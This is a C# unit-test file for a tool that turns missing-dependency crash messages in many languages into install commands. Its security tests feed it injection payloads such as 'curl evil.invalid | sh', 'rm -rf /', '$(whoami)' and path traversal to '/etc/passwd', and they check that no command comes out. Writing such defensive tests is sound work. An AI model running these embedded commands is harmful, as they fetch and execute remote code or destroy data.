using FixFinder.Core.Execution;
using FixFinder.Core.Parsing;
using FixFinder.Core.Sources;

namespace FixFinder.Tests;

/// <summary>
/// Reading a missing dependency out of a crash in every ecosystem except Python's, and refusing to
/// build a command out of anything that is not one.
/// </summary>
/// <remarks>
/// Same standard as <see cref="MissingModuleTests"/>, applied six more times: the name comes out of
/// whatever the program printed, so most of what is below is about what this declines to do. The
/// refusals are not hypothetical - a crash reported by a program that is already misbehaving is
/// exactly where a made-up name would arrive.
/// </remarks>
public class MissingDependencyTests
{
    private static ParsedError Error(
        string language, string message, string? type = null, ParsedError[]? causes = null) => new()
    {
        LanguageId = language,
        Confidence = 90,
        RawText = type is null ? message : $"{type}: {message}",
        FirstLineSequence = 0,
        ExceptionType = type,
        Message = message,
        Frames = [],
        Causes = causes ?? [],
    };

    private static TargetSpec Spec(string? workingDirectory = null) => new()
    {
        ExecutablePath = @"C:\tools\node.exe",
        Arguments = "app.js",
        WorkingDirectory = workingDirectory ?? @"C:\work\nowhere-in-particular",
    };

    private static string? Text(ParsedError error, string? workingDirectory = null) =>
        MissingDependency.For(error, Spec(workingDirectory))?.Command;

    // ------------------------------------------------------------------ node

    [Theory]
    [InlineData("Cannot find module 'express'", "npm install express")]
    [InlineData("Cannot find package 'chalk' imported from C:\\app\\index.mjs", "npm install chalk")]
    [InlineData("Cannot find module '@babel/core'", "npm install @babel/core")]
    public void NodeNamesThePackageToInstall(string message, string expected) =>
        Assert.Equal(expected, Text(Error("node", message, "Error")));

    /// <summary>A deep import still installs the package, not the path inside it.</summary>
    [Theory]
    [InlineData("Cannot find module 'lodash/fp'", "npm install lodash")]
    [InlineData("Cannot find module '@babel/core/lib/parser'", "npm install @babel/core")]
    public void ASubpathImportInstallsThePackageThatContainsIt(string message, string expected) =>
        Assert.Equal(expected, Text(Error("node", message, "Error")));

    /// <summary>
    /// A relative specifier is a missing file of your own, and must never become an install.
    /// </summary>
    /// <remarks>
    /// The dangerous version of getting this wrong is not a command that fails. <c>./utils</c>
    /// resolving to a real <c>utils</c> on the registry would install a stranger's package to fix
    /// a typo in a local filename.
    /// </remarks>
    [Theory]
    [InlineData("Cannot find module './utils'")]
    [InlineData("Cannot find module '../lib/db'")]
    [InlineData("Cannot find module '/opt/app/thing'")]
    [InlineData("Cannot find module 'C:\\app\\thing'")]
    public void ARelativeImportIsNotAPackage(string message) =>
        Assert.Null(Text(Error("node", message, "Error")));

    /// <summary>A built-in is never missing, and every one of them is squatted on the registry.</summary>
    [Theory]
    [InlineData("Cannot find module 'fs'")]
    [InlineData("Cannot find module 'path'")]
    [InlineData("Cannot find module 'node:crypto'")]
    public void ABuiltInModuleIsNotOfferedForInstall(string message) =>
        Assert.Null(Text(Error("node", message, "Error")));

    /// <summary>The project's own package manager, read off its lockfile.</summary>
    [Theory]
    [InlineData("pnpm-lock.yaml", "pnpm add express")]
    [InlineData("yarn.lock", "yarn add express")]
    [InlineData("bun.lockb", "bun add express")]
    [InlineData("package-lock.json", "npm install express")]
    public void TheInstallMatchesTheLockfileInTheProject(string lockfile, string expected)
    {
        using var temp = new TempFolder();
        File.WriteAllText(Path.Combine(temp.Path, lockfile), "");

        Assert.Equal(expected, Text(Error("node", "Cannot find module 'express'", "Error"), temp.Path));
    }

    // ------------------------------------------------------------------ ruby

    [Fact]
    public void RubyNamesTheGem() =>
        Assert.Equal(
            "gem install nokogiri",
            Text(Error("ruby", "cannot load such file -- nokogiri", "LoadError")));

    /// <summary>Rails requires with underscores and publishes without them.</summary>
    [Theory]
    [InlineData("cannot load such file -- active_support", "gem install activesupport")]
    [InlineData("cannot load such file -- active_record/base", "gem install activerecord")]
    public void ARequirePathThatDiffersFromTheGemIsTranslated(string message, string expected) =>
        Assert.Equal(expected, Text(Error("ruby", message, "LoadError")));

    [Fact]
    public void ABundledProjectGetsTheBundlerCommand()
    {
        using var temp = new TempFolder();
        File.WriteAllText(Path.Combine(temp.Path, "Gemfile"), "source 'https://rubygems.org'\n");

        Assert.Equal(
            "bundle add nokogiri",
            Text(Error("ruby", "cannot load such file -- nokogiri", "LoadError"), temp.Path));
    }

    [Fact]
    public void ARelativeRequireIsNotAGem() =>
        Assert.Null(Text(Error("ruby", "cannot load such file -- ./helpers", "LoadError")));

    // ------------------------------------------------------------------ go

    [Theory]
    [InlineData(
        "no required module provides package github.com/gorilla/mux; to add it:",
        "go get github.com/gorilla/mux")]
    [InlineData(
        "cannot find module providing package gopkg.in/yaml.v3",
        "go get gopkg.in/yaml.v3")]
    public void GoNamesTheModuleToGet(string message, string expected) =>
        Assert.Equal(expected, Text(Error("go", message)));

    /// <summary>
    /// A module path is the one name here that legitimately contains slashes, so it is the one
    /// that has to prove it cannot climb.
    /// </summary>
    [Theory]
    [InlineData("no required module provides package ../../../etc/passwd")]
    [InlineData("no required module provides package github.com/../../evil")]
    [InlineData("no required module provides package -insecure")]
    [InlineData("no required module provides package notahost")]
    public void AGoPathThatIsNotAModulePathIsRefused(string message) =>
        Assert.Null(Text(Error("go", message)));

    // ------------------------------------------------------------------ rust

    [Theory]
    [InlineData("can't find crate for `serde`", "cargo add serde")]
    [InlineData("use of undeclared crate or module `rand`", "cargo add rand")]
    [InlineData("unresolved import `tokio`", "cargo add tokio")]
    public void RustNamesTheCrateToAdd(string message, string expected) =>
        Assert.Equal(expected, Text(Error("rust", message)));

    /// <summary>These are path keywords and the standard library, not crates on crates.io.</summary>
    [Theory]
    [InlineData("unresolved import `crate`")]
    [InlineData("unresolved import `self`")]
    [InlineData("unresolved import `super`")]
    [InlineData("can't find crate for `std`")]
    public void APathKeywordIsNotACrate(string message) =>
        Assert.Null(Text(Error("rust", message)));

    // ------------------------------------------------------------------ .net

    /// <summary>The display name carries a version and a key; the package is the part before them.</summary>
    [Fact]
    public void DotNetTakesTheAssemblyNameWithoutItsVersion() =>
        Assert.Equal(
            "dotnet add package Newtonsoft.Json",
            Text(Error(
                "csharp",
                "Could not load file or assembly 'Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, " +
                "PublicKeyToken=30ad4fe6b2a6aeed'. The system cannot find the file specified.",
                "System.IO.FileNotFoundException")));

    // ------------------------------------------------------------------ java

    /// <summary>
    /// Java is configured by editing a build file, so the fix is a block to paste rather than a
    /// line to run - which is exactly what a copy button is for.
    /// </summary>
    [Fact]
    public void JavaGivesThePomBlockForAKnownArtifact()
    {
        var fix = MissingDependency.For(
            Error("java", "org.apache.commons.lang3.StringUtils", "java.lang.ClassNotFoundException"),
            Spec());

        Assert.NotNull(fix);
        Assert.Contains("<groupId>org.apache.commons</groupId>", fix!.Command!, StringComparison.Ordinal);
        Assert.Contains("<artifactId>commons-lang3</artifactId>", fix.Command!, StringComparison.Ordinal);
        Assert.Contains("pom.xml", fix.CommandDescription, StringComparison.Ordinal);
    }

    /// <summary>NoClassDefFoundError prints the internal form, with slashes.</summary>
    [Fact]
    public void TheInternalClassFormIsUnderstood()
    {
        var fix = MissingDependency.For(
            Error("java", "com/google/gson/Gson", "java.lang.NoClassDefFoundError"), Spec());

        Assert.NotNull(fix);
        Assert.Contains("com.google.code.gson", fix!.Command!, StringComparison.Ordinal);
    }

    [Fact]
    public void AGradleProjectGetsTheGradleLine()
    {
        using var temp = new TempFolder();
        File.WriteAllText(Path.Combine(temp.Path, "build.gradle"), "plugins { id 'java' }\n");

        var fix = MissingDependency.For(
            Error("java", "org.slf4j.LoggerFactory", "java.lang.ClassNotFoundException"),
            Spec(temp.Path));

        Assert.NotNull(fix);
        Assert.Equal("implementation(\"org.slf4j:slf4j-api:VERSION\")", fix!.Command);
        Assert.Contains("build.gradle", fix.CommandDescription, StringComparison.Ordinal);
    }

    /// <summary>
    /// An unmapped class produces nothing, deliberately.
    /// </summary>
    /// <remarks>
    /// A class name does not contain its Maven coordinate and there is no offline way to derive
    /// one. A guessed groupId would not merely be wrong - it would not resolve at all, which is a
    /// worse outcome than letting the search answer it.
    /// </remarks>
    [Fact]
    public void AnUnknownJavaClassIsLeftToTheSearch() =>
        Assert.Null(Text(Error(
            "java", "com.acme.internal.Widget", "java.lang.ClassNotFoundException")));

    /// <summary>Java almost always reports this wrapped, so the chain has to be searched.</summary>
    [Fact]
    public void ADependencyIsFoundInsideACauseChain()
    {
        var error = Error("java", "Could not initialise the mapper", "java.lang.ExceptionInInitializerError", causes:
        [
            Error("java", "com.fasterxml.jackson.databind.ObjectMapper", "java.lang.ClassNotFoundException"),
        ]);

        Assert.Contains("jackson-databind", Text(error)!, StringComparison.Ordinal);
    }

    // ------------------------------------------------------------------ the newer languages

    /// <summary>Perl writes the module as a path, and the translation back is exact.</summary>
    [Theory]
    [InlineData("Can't locate LWP/UserAgent.pm in @INC (you may need to install the LWP::UserAgent module)",
        "cpanm LWP::UserAgent")]
    [InlineData("Can't locate JSON.pm in @INC (@INC contains: /usr/lib/perl5)", "cpanm JSON")]
    public void PerlNamesTheModuleToInstall(string message, string expected) =>
        Assert.Equal(expected, Text(Error("perl", message)));

    [Theory]
    [InlineData("Class \"GuzzleHttp\\Client\" not found", "composer require guzzlehttp/guzzle")]
    [InlineData("Class \"Symfony\\Component\\Console\\Application\" not found", "composer require symfony/console")]
    [InlineData("Class \"Monolog\\Logger\" not found", "composer require monolog/monolog")]
    public void PhpNamesTheComposerPackage(string message, string expected) =>
        Assert.Equal(expected, Text(Error("php", message, "Error")));

    /// <summary>A namespace nobody mapped produces nothing, for Java's reason.</summary>
    [Fact]
    public void AnUnknownPhpNamespaceIsLeftToTheSearch() =>
        Assert.Null(Text(Error("php", "Class \"Acme\\Internal\\Widget\" not found", "Error")));

    [Fact]
    public void DartNamesThePackageToAdd() =>
        Assert.Equal(
            "dart pub add http",
            Text(Error("dart", "Couldn't resolve the package 'http' in 'package:http/http.dart'")));

    [Theory]
    [InlineData("module 'socket' not found", "luarocks install socket")]
    [InlineData("module 'socket.http' not found", "luarocks install socket")]
    public void LuaNamesTheRockToInstall(string message, string expected) =>
        Assert.Equal(expected, Text(Error("lua", message)));

    // ------------------------------------------------------------------ nothing gets through

    /// <summary>
    /// The security boundary, across every ecosystem at once.
    /// </summary>
    /// <remarks>
    /// A program can print whatever it likes, and a crashing program is the likeliest place for
    /// something strange to come from. None of these may become a command - and the check is that
    /// no answer is produced at all, not that the answer was escaped.
    /// </remarks>
    [Theory]
    [InlineData("node", "Cannot find module 'express && curl evil.invalid | sh'")]
    [InlineData("node", "Cannot find module '--registry=http://evil.invalid'")]
    [InlineData("node", "Cannot find module 'x; rm -rf /'")]
    [InlineData("node", "Cannot find module '$(whoami)'")]
    [InlineData("ruby", "cannot load such file -- nokogiri;curl evil.invalid")]
    [InlineData("ruby", "cannot load such file -- --version=`id`")]
    [InlineData("go", "no required module provides package github.com/x/y && echo hi")]
    [InlineData("rust", "can't find crate for `serde; echo hi`")]
    [InlineData("csharp", "Could not load file or assembly '--interactive'")]
    [InlineData("java", "org.apache.commons.lang3.StringUtils; echo hi")]
    [InlineData("perl", "Can't locate LWP/UserAgent.pm; curl evil.invalid in @INC")]
    [InlineData("php", "Class \"GuzzleHttp\\Client; curl evil.invalid\" not found")]
    [InlineData("dart", "Couldn't resolve the package 'http && curl evil.invalid'")]
    [InlineData("lua", "module 'socket; curl evil.invalid' not found")]
    public void NothingThatIsNotAPackageNameBecomesACommand(string language, string message)
    {
        var command = Text(Error(language, message, "Error"));

        Assert.True(
            command is null || !command.Contains("evil.invalid", StringComparison.Ordinal),
            $"produced: {command}");

        foreach (var dangerous in new[] { "&&", "||", ";", "|", "$(", "`", "rm -rf" })
            Assert.DoesNotContain(dangerous, command ?? "", StringComparison.Ordinal);
    }

    /// <summary>
    /// Reading the whole token rather than stopping at the first space.
    /// </summary>
    /// <remarks>
    /// <see cref="MissingModule"/> was caught by this once already, and all three of these were
    /// caught by driving the hostile inputs through and reading the output rather than trusting
    /// the refusal tests above - which passed, because each one happened to fail validation for an
    /// unrelated reason. The flaw is not an injection: the extra text is dropped, not run. It is
    /// that a line a program made up silently becomes a different, plausible line, and a
    /// suggestion that looks perfectly ordinary is the one nobody checks.
    /// </remarks>
    [Theory]
    [InlineData("go", "no required module provides package github.com/x/y && curl evil.invalid", null)]
    [InlineData("ruby", "cannot load such file -- nokogiri && curl evil.invalid", "LoadError")]
    [InlineData("java", "org.apache.commons.lang3.StringUtils && curl evil.invalid", "java.lang.ClassNotFoundException")]
    public void ANameWithAnythingAfterItIsNotTruncatedIntoAValidOne(
        string language, string message, string? type) =>
        Assert.Null(Text(Error(language, message, type)));

    /// <summary>Ruby prints the error class after the name, and that much is allowed.</summary>
    [Fact]
    public void RubysOwnLoadErrorSuffixIsNotMistakenForJunk() =>
        Assert.Equal(
            "gem install nokogiri",
            Text(Error("ruby", "app.rb:1:in 'require': cannot load such file -- nokogiri (LoadError)")));

    /// <summary>
    /// A class that could not be initialised is not a class that is missing.
    /// </summary>
    /// <remarks>
    /// Same words, different problem - the class is present and its static initialiser threw.
    /// Answering it with "add this dependency" sends someone to look in the wrong place entirely.
    /// </remarks>
    [Fact]
    public void AClassThatFailedToInitialiseIsNotAMissingDependency() =>
        Assert.Null(Text(Error(
            "java", "Could not initialize class com.acme.Thing", "java.lang.NoClassDefFoundError")));

    /// <summary>Python keeps its own path, which installs into the interpreter that crashed.</summary>
    [Fact]
    public void PythonIsLeftToTheOneThatKnowsWhichInterpreterRanIt() =>
        Assert.Null(Text(Error("python", "No module named 'requests'", "ModuleNotFoundError")));

    /// <summary>An error that is not about a missing dependency produces nothing.</summary>
    [Theory]
    [InlineData("node", "undefined is not a function")]
    [InlineData("go", "index out of range [3] with length 2")]
    [InlineData("rust", "attempt to divide by zero")]
    [InlineData("csharp", "Object reference not set to an instance of an object.")]
    public void AnOrdinaryCrashIsNotADependencyProblem(string language, string message) =>
        Assert.Null(Text(Error(language, message, "Error")));
}
